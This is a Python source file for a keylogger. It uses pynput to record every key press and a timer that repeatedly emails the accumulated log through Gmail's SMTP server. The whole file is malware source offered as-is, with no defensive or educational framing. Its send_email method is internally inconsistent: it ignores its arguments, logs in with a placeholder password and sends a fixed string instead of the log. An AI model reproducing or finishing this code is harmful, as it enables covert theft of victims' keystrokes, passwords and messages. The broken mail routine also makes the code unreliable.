import pynput.keyboard
import threading
import smtplib

log = ""
class Keylogger:
    def __init__(self, time_interval):
        self.log = ""
        self.interval = time_interval
        self.email = "you@gmail.com"
        self.password = ""
        
    def append_to_log(self, string):
        self.log = self.log + string
        
    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):
        self.send_email(self.email, self.password, self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()
        
    def send_email(self, email, password, message):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login("you@gmail.com", "password")
        server.sendmail("you@gmail.com", "to@gmail.com", "mensaje")
        server.quit()
    
    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()